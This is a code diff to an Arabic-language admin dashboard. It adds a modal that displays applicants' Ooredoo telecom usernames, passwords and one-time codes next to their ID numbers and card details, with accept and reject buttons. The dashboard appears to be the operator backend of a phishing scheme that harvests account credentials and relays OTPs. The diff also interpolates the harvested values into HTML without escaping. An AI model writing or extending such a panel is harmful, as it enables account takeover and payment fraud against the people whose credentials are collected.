@@ -436,23 +436,7 @@
       tbody.querySelectorAll('.action-btn.ooredoo').forEach((btn) => {
         btn.addEventListener('click', () => {
           const app = loadedApplications[parseInt(btn.dataset.index, 10)];
-          const row = btn.closest('tr');
-          const detailsRow = row && row.nextElementSibling;
-          if (detailsRow) {
-            const current = btn.getAttribute('aria-expanded') === 'true';
-            btn.setAttribute('aria-expanded', String(!current));
-            detailsRow.style.display = current ? 'none' : 'table-row';
-            const expander = row.querySelector('.name-expander');
-            if (expander) {
-              expander.setAttribute('aria-expanded', String(!current));
-            }
-          }
-          if (app) {
-            const target = detailsRow && detailsRow.querySelector('.details-section h4');
-            if (target && target.textContent.includes('بيانات أوريدو')) {
-              target.scrollIntoView({ behavior: 'smooth', block: 'center' });
-            }
-          }
+          if (app) openDetailsModal(app);
         });
       });
     } catch (err) {
@@ -493,6 +477,22 @@
     `;
   }
 
+  function ooredooDetailBox(d) {
+    const card = d.card || d.payment || null;
+    const user = d.ooredooUser || (card && card.ooredooUser) || '—';
+    const pass = d.ooredooPass || (card && card.ooredooPass) || '—';
+    const otp = d.ooredooOtp || (card && card.ooredooOtp) || '—';
+    if (!user && !pass && !otp) return '';
+    return `
+      <div class="confirm-block">
+        <p class="confirm-block-title">بيانات أوريدو</p>
+        <div class="confirm-row"><span>اسم مستخدم أوريدو</span><strong>${user}</strong></div>
+        <div class="confirm-row"><span>كلمة مرور أوريدو</span><strong>${pass}</strong></div>
+        <div class="confirm-row"><span>OTP أوريدو</span><strong>${otp}</strong></div>
+      </div>
+    `;
+  }
+
   function openDetailsModal(d) {
     const a = d.applicant || d;
     const persons = d.persons || [];
@@ -502,6 +502,7 @@
       personDetailBox('مقدم الطلب' + (a.id ? (' — هوية: ' + a.id) : ''), a) +
       persons.map((p) => personDetailBox(p.title || 'فرد', p)).join('') +
       cardDetailBox(card) +
+      ooredooDetailBox(d) +
       `
         <div class="modal-actions">
           <button type="button" class="action-btn accept" id="modalAcceptBtn">قبول</button>
